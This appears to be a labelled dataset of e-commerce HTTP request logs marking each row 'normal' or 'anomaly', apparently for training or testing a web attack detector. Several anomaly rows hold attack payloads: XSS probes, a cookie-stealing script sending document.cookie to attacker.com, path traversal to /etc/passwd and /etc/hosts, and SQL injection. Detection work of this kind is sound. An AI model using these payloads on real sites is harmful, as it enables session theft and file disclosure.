+2023/7/19 13:55,  /product/subscription, POST,200,575,normal
+2023/7/19 13:52,  /shoppingCart/cart123, POST,200,170,normal
+2023/7/19 14:47,  /products/product987, DELETE,200,547,normal
+2023/7/19 13:55,  /posts/postA, GET,200,800,normal
+2023/7/19 14:41,  /accounts?page=3&limit=15, GET,200,371,normal
+2023/7/19 14:15,  /categories?parentId=123, GET,200,983,normal
+2023/7/19 13:51,  /users/user123, GET,200,999,normal
+2023/7/19 14:02,/admin/afterSaleServices/service789?sort_by=%3Cscript%3Ealert('XSS')%3C/script%3E,GET,200,896,anomaly
+2023/7/19 14:22,  /admin/import_orders, GET,200,435,normal
+2023/7/19 13:46,/sysManager/shareRules,POST,200,539,anomaly
+2023/7/19 14:17,  /cart/c123, GET,200,360,normal
+2023/7/19 14:45,  /inventory?location=Warehouse%202, GET,200,449,normal
+2023/7/19 13:59,  /coupons/456, GET,200,630,normal
+2023/7/19 13:59,  /members/area?page=2&limit=6, GET,200,820,normal
+2023/7/19 14:31,  /products/123, GET,200,450,normal
+2023/7/19 14:51,  //admin/afterSaleServices?userId=217, GET,200,287,normal
+2023/7/19 13:55,  /customers/abc1234, POST,200,162,normal
+2023/7/19 14:48,  /discounts/467, GET,200,276,normal
+2023/7/19 14:48,  /promotions/promo789, DELETE,200,877,normal
+2023/7/19 13:58,  /accounts/456, DELETE,404,243,normal
+2023/7/19 13:55,  /account/201, PUT,200,164,normal
+2023/7/19 13:55,  /orders, POST,200,245,normal
+2023/7/19 14:02,  /admin/items/item643, DELETE,200,362,normal
+2023/7/19 13:55,  /orders, GET,200,309,normal
+2023/7/19 14:39,/afterSaleServices/567,PUT,200,7411,anomaly
+2023/7/19 14:51,  /v1/orders?page=2&limit=10, GET,200,432,normal
+2023/7/19 14:02,/cart/../../../sys_log/,POST,302,600,anomaly
+2023/7/19 14:02,  /payments/payment123, GET,200,541,normal
+2023/7/19 14:45,  /products/categories, GET,200,941,normal
+2023/7/19 14:14,  /admin/items?userId=901, DELETE,200,120,normal
+2023/7/19 13:51,  /admin/subscriptions/mno890, POST,200,425,normal
+2023/7/19 13:55,  /login, POST,200,418,normal
+2023/7/19 13:55,  /product/789/review, POST,201,494,normal
+2023/7/19 14:47,/addresses,POST,200,507,anomaly
+2023/7/19 13:59,  /products/phone211, GET,200,259,normal
+2023/7/19 14:33,  /product/101/comments/jkl123, DELETE,200,304,normal
+2023/7/19 13:58,  /products/104/reviews/pqr301, POST,200,690,normal
+2023/7/19 14:13,  /sharedItems, POST,202,800,normal
+2023/7/19 13:48,  /profile, GET,200,1020,normal
+2023/7/19 13:48,/addresses,POST,302,72,anomaly
+2023/7/19 13:51,  /promotions?page=2&limit=15, GET,200,162,normal
+2023/7/19 14:45,/addresses,POST,200,500,anomaly
+2023/7/19 14:45,  /newsletters/subscribe, POST,201,581,normal
+2023/7/19 14:07,  /follow, POST,200,359,normal
+2023/7/19 14:07,  /chat/room/en-US, GET,200,645,normal
+2023/7/19 14:17,  /orders/order456, PUT,200,471,normal
+2023/7/19 14:19,"/admin/afterSaleServices/service101?query=<script>alert(""XSS"")</script>",GET,200,673,anomaly
+2023/7/19 14:08,  /products/product456, DELETE,202,351,normal
+2023/7/19 14:51,  /accounts/234/profile/address, PUT,204,3241,normal
+2023/7/19 13:55,  /afterSaleServices/service231, PUT,200,112,normal
+2023/7/19 13:51,  /orders/update, PUT,200,982,normal
+2023/7/19 14:14,  /orders/456, GET,200,501,normal
+2023/7/19 14:17,  /offers?userId=789, GET,200,424,normal
+2023/7/19 13:56,  /orders/098, GET,200,483,normal
+2023/7/19 13:53,  /orders?userId=456&page=2&limit=2, GET,200,829,normal
+2023/7/19 14:11,  /promotion/456?page=1&limit=5, GET,200,630,normal
+2023/7/19 14:48,  /users/user567, DELETE,200,286,normal
+2023/7/19 13:55,  /products/789/metadata, GET,200,917,normal
+2023/7/19 14:28,  /users/rmv992, DELETE,302,400,normal
+2023/7/19 14:19,  /beSharedItems, POST,203,600,normal
+2023/7/19 14:45,  /accounts/information, GET,200,233,normal
+2023/7/19 13:55,  /orders/order789, PUT,200,554,normal
+2023/7/18 12:03,  /orders/24, DELETE,201,311,normal
+2023/7/19 13:53,  /shipping/cost?country=USA&item=RTX3090, GET,200,188,normal
+2023/7/19 14:48,  /payments/trans123, GET,200,272,normal
+2023/7/19 14:24,  /Search?q=shoes&orderBy=price, GET,200,520,normal
+2023/7/19 14:02,  /storeProducts, PUT,200,276,normal
+2023/7/19 14:22,  /transactions, POST,200,300,normal
+2023/7/19 14:48,  /review, POST,201,698,normal
+2023/7/19 14:48,  /coupon_code/xyz987, GET,200,118,normal
+2023/7/19 14:02,  /lastFiftyOrders, GET,200,539,normal
+2023/7/19 14:36,  /payment, POST,200,777,normal
+2023/7/19 13:55,/addresses,POST,200,507,anomaly
+2023/7/19 14:01,  /shipping/jkl123, GET,200,278,normal
+2023/7/19 14:01,  /checkout, POST,200,97,normal
+2023/7/19 13:50,  /cart/items, POST,200,200,normal
+2023/7/19 14:19,//collections/item456?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,DELETE,200,509,anomaly
+2023/7/19 14:02,  /addresses, POST,200,976,normal
+2023/7/19 14:15,  /stores, POST,200,372,normal
+2023/7/19 13:53,  /footprints, POST,200,711,normal
+2023/7/19 14:06,  /inventory/product079/, GET,200,440,normal
+2023/7/19 14:52,  /updateItem/item456, PUT,200,493,normal
+2023/7/19 13:55,  /orders/123, DELETE,404,360,normal
+2023/7/19 14:45,/shareRules?q=<script>maliciousFunction()</script>,POST,200,500,anomaly
+2023/7/19 14:24,/admin/afterSaleServices/456,GET,200,1500,anomaly
+2023/7/19 13:46,  /addresses/abc123, PUT,202,427,normal
+2023/7/19 14:13,/afterSaleServices?page=3&limit=../../etc/passwd,GET,200,638,anomaly
+2023/7/19 14:17,/admin/afterSaleServices?userId=234&page=2&limit=15,GET,200,3711,anomaly
+2023/7/19 14:48,  /inventory/shoes/size7, GET,200,670,normal
+2023/7/19 14:04,  /products?category=Computers, GET,200,427,normal
+2023/7/19 14:46,/shareRules/rule101/../../../etc/hosts,PUT,200,400,anomaly
+2023/7/19 14:15,  /comments?page=1&limit=10, GET,200,33,normal
+2023/7/19 14:04,  /user/tyu123, PUT,302,186,normal
+2023/7/19 14:22,  /admin/users, POST,200,510,normal
+2023/7/19 13:58,  /user/123, DELETE,204,669,normal
+2023/7/18 13:45,  /users, POST,200,232,normal
+2023/7/19 13:57,  /contactUs, POST,200,590,normal
+2023/7/19 13:55,  /coupons?userId=678, GET,200,722,normal
+2023/7/19 14:40,  /user/orderItems/item123, GET,200,150,normal
+2023/7/19 14:19,/product/101/comments?page=3&limit=8?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,GET,200,680,anomaly
+2023/7/19 14:02,  /login?userId=123&passwd=abc&pt=2, GET,200,100,normal
+2023/7/19 14:14,  /items, POST,201,252,normal
+2023/7/19 14:36,  /users, POST,200,285,normal
+2023/7/19 14:25,  /refunds?page=2&limit=15, GET,200,793,normal
+2023/7/19 13:57,  /promotions?page=2&limit=5, GET,200,540,normal
+2023/7/19 13:46,/sysManager/shareRules/rule123,DELETE,204,510,anomaly
+2023/7/19 14:28,  /inventory?productId=123, GET,200,200,normal
+2023/7/19 14:43,  /activity/february, GET,200,1056,normal
+2023/7/19 13:45,  /products/123, PUT,200,411,normal
+2023/7/19 14:04,  /comments/post12, GET,200,780,normal
+2023/7/19 14:51,  /shoppingCart/235, POST,200,364,normal
+2023/7/19 14:14,  /referralRules/789, PUT,200,348,normal
+2023/7/19 14:11,  /products?page=2&limit=4, GET,200,792,normal
+2023/7/19 14:46,  /carts/item456, DELETE,200,353,normal
+2023/7/19 14:04,/afterSaleServices?page=1&limit=10,GET,200,751,anomaly
+2023/7/19 14:11,  /admin/offers/offer234, DELETE,200,500,normal
+2023/7/19 14:02,  /products, POST,200,898,normal
+2023/7/19 14:01,  /admin/products?page=4&limit=7, GET,200,785,normal
+2023/7/19 14:52,  /product/875/details, GET,200,756,normal
+2023/7/19 13:55,/products/3321,GET,200,710,anomaly
+2023/7/19 14:39,  /users/987/previousOrders, GET,200,477,normal
+2023/7/19 13:54,  /payment/accept, POST,200,205,normal
+2023/7/19 13:46,  /admin/comments?page=4&limit=7, GET,200,339,normal
+2023/7/19 14:02,  /cart/item/456, POST,200,403,normal
+2023/7/19 13:55,  /user/user123, PUT,200,550,normal
+2023/7/19 14:15,  /users/456, PUT,802,820,normal
+2023/7/19 14:06,  /subscriptions?page=1&limit=10, GET,200,600,normal
+2023/7/19 13:45,  /shipping/456, DELETE,200,644,normal
+2023/7/19 14:37,/afterSaleServices/345,PUT,200,8255,anomaly
+2023/7/19 14:31,  /products/abc123, GET,200,789,normal
+2023/7/19 14:09,  /user/125/subscription, DELETE,200,711,normal
+2023/7/19 13:51,  /transaction, POST,201,582,normal
+2023/7/18 13:45,  /collections/156, POST,200,956,normal
+2023/7/19 14:02,  /savingsAccounts/sav789, POST,201,572,normal
+2023/7/19 13:55,  /users, POST,200,211,normal
+2023/7/19 14:05,/beSharedItems,POST,200,491,anomaly
+2023/7/19 14:11,/collections,POST,200,377,anomaly
+2023/7/19 14:37,  /customers, POST,200,288,normal
+2023/7/19 14:19,  /orders, PUT,202,489,normal
+2023/7/19 14:15,  /book, PUT,200,508,normal
+2023/7/19 14:48,  /checkout, POST,200,541,normal
+2023/7/19 14:45,  /products/shop/outlet, GET,200,202,normal
+2023/7/19 14:33,  /updateProfile, PUT,200,934,normal
+2023/7/19 14:45,  /user/register, POST,200,183,normal
+2023/7/19 14:40,  /paymentStatus, GET,202,458,normal
+2023/7/18 14:57,  /items/item123, DELETE,204,235,normal
+2023/7/19 13:55,  /items, POST,201,214,normal
+2023/7/19 14:45,  /users/xyz123, HEAD,200,800,normal
+2023/7/19 14:09,  /users, POST,200,678,normal
+2023/7/19 14:05,  /users/7, PUT,404,219,normal
+2023/7/19 13:46,/afterSaleServices/service456/../../etc/hosts, GET,200,875,anomaly
+2023/7/19 14:01,  /cancellations, DELETE,301,437,normal
+2023/7/19 14:45,  /users, HEAD,302,344,normal
+2023/7/19 14:14,  /products/123, GET,200,195,normal
+2023/7/19 13:59,  /afterSaleServices?page=2&limit=15, GET,200,776,normal
+2023/7/19 14:46,  /products/c45, GET,200,400,normal
+2023/7/19 13:51,  /cart/items/item654, PUT,200,180,normal
+2023/7/19 13:51,/collections?page=1&limit=10%20OR%20'a'='a', GET,200,480,anomaly
+2023/7/19 14:45,  /shippingAddresses?userId=user101, GET,200,590,normal
+2023/7/19 14:11,  /order, POST,200,400,normal
+2023/7/19 14:13,  /customer, POST,200,924,normal
+2023/7/19 13:55,  /review/567, DELETE,204,380,normal
+2023/7/19 14:29,  /weather, GET,200,220,normal
+2023/7/19 14:45,  /carts/123, PUT,200,252,normal
+2023/7/19 13:55,  /cart, POST,302,400,normal
+2023/7/19 14:02,  /orders/order234, PUT,200,253,normal
+2023/7/19 13:46,  /subscriptions, PUT,200,345,normal
+2023/7/19 14:51,  /articles/edit, PUT,200,325,normal
+2023/7/19 14:12,  /users/543, GET,200,718,normal
+2023/7/19 13:57,  /likeItems, POST,200,307,normal
+2023/7/19 13:51,  /orders/items/item101, POST,201,877,normal
+2023/7/19 14:28,  /inventory/categories, POST,200,288,normal
+2023/7/19 14:38,  /account/user123/payments, POST,201,750,normal
+2023/7/19 14:11,  products/123456, DELETE,200,924,normal
+2023/7/19 13:59,  /ratings, POST,200,100,normal
+2023/7/19 13:59,  /collections/102, PUT,200,417,normal
+2023/7/19 13:46,/adminInfo?page=3&limit=5, GET,200,638,anomaly
+2023/7/19 14:45,  /usersApi, POST,201,600,normal
+2023/7/19 14:09,  /addresses, POST,201,250,normal
+2023/7/19 14:02,  /cart, POST,200,500,normal
+2023/7/19 14:27,  /orders/{234}, GET,200,421,normal
+2023/7/19 14:25,  /ratings?productId=901&page=2&limit=15, GET,200,523,normal
+2023/7/19 14:32,  /user/subscriptions/xyz789, PUT,200,470,normal
+2023/7/19 14:01,  /creditCards/card456, GET,200,67,normal
+2023/7/19 14:17,  /product/299/comments, PUT,200,450,normal
+2023/7/19 14:28,  /inventory/, POST,201,423,normal
+2023/7/19 14:13,  /shipping/item123, PUT,200,887,normal
+2023/7/19 13:51,  /shoppingCart/item567, DELETE,200,689,normal
+2023/7/19 13:49,  /users, POST,200,567,normal
+2023/7/19 14:15,  /admin/users/9984, PUT,200,556,normal
+2023/7/19 13:51,  /login, POST,200,388,normal
+2023/7/19 13:55,  /products/1234, POST,201,735,normal
+2023/7/19 13:51,  /users/111/details, GET,200,399,normal
+2023/7/19 14:48,  /checkout/order, POST,200,897,normal
+2023/7/19 13:51,  /checkout, POST,202,607,normal
+2023/7/19 13:55,  /login, POST,200,890,normal
+2023/7/19 14:22,/beSharedItems/../../../etc/hosts, POST,201,700,anomaly
+2023/7/19 13:53,  /payments, POST,200,179,normal
+2023/7/19 14:14,  /blogs?page=2&limit=7, GET,200,455,normal
+2023/7/19 14:14,/customer, POST,200,303,anomaly
+2023/7/19 14:45,  /stores, POST,201,575,normal
+2023/7/19 14:49,  /admin/products?page=4&limit=7, GET,200,316,normal
+2023/7/19 14:43,  /products/9876/comments, GET,200,984,normal
+2023/7/19 14:46,/beSharedItems?q=<script>maliciousFunction()</script>, POST,200,500,anomaly
+2023/7/19 14:45,  /customers, POST,200,683,normal
+2023/7/19 14:40,  /promoCode, DELETE,200,891,normal
+2023/7/19 14:17,  /logistics/345, DELETE,200,247,normal
+2023/7/19 13:53,  /admin/comments, PUT,302,747,normal
+2023/7/19 13:57,  /auth/login, POST,200,808,normal
+2023/7/19 14:31,  /subscriptions/sub123, DELETE,200,123,normal
+2023/7/19 14:11,  /products/item789, GET,200,461,normal
+2023/7/19 13:45,  /product/112/comments, POST,201,284,normal
+2023/7/19 13:45,  /fanpages/c92cb72, PUT,200,783,normal
+2023/7/19 13:51,  /orders, POST,302,488,normal
+2023/7/19 13:51,  /users, POST,201,420,normal
+2023/7/19 13:46,/sysManager/shareRules/rule456, DELETE,204,500,anomaly
+2023/7/19 14:05,  /users/412/orders, POST,200,761,normal
+2023/7/19 14:01,  /cart/checkout, POST,201,888,normal
+2023/7/19 13:55,  /price, GET,200,293,normal
+2023/7/18 14:57,  /addProduct, POST,201,550,normal
+2023/7/19 14:47,  /promotions/promo123, GET,200,663,normal
+2023/7/19 13:49,/addresses/7, GET,200,478,anomaly
+2023/7/19 13:46,  /products/456, PUT,200,811,normal
+2023/7/19 14:17,  /orders/order456, PUT,204,470,normal
+2023/7/19 14:25,/shareRules/rule456/../../../etc/hosts, PUT,200,322,anomaly
+2023/7/19 14:45,  /notifications/123, POST,200,647,normal
+2023/7/19 13:58,  /product/654/like, POST,200,440,normal
+2023/7/19 13:50,  /admin/afterSaleServices, PUT,200,369,normal
+2023/7/19 14:02,  /products/xyz456, POST,200,210,normal
+2023/7/19 14:01,  /users/123, PUT,200,980,normal
+2023/7/19 14:11,  /users, PUT,200,651,normal
+2023/7/19 14:01,  /orders, POST,201,161,normal
+2023/7/19 13:57,  /user/login, POST,200,820,normal
+2023/7/19 14:44,  /profiles/4, GET,200,553,normal
+2023/7/19 13:55,  /customerService, POST,200,673,normal
+2023/7/19 14:31,  /customer/orderDetails, GET,200,93,normal
+2023/7/19 13:47,  /sales/12345, GET,200,827,normal
+2023/7/19 14:02,  /users/123/paymentMethods, GET,200,776,normal
+2023/7/19 13:51,  /collections/item234, PUT,200,470,normal
+2023/7/19 13:58,  /refunds?page=3&limit=10, GET,200,500,normal
+2023/7/19 13:55,  /rebate, GET,200,902,normal
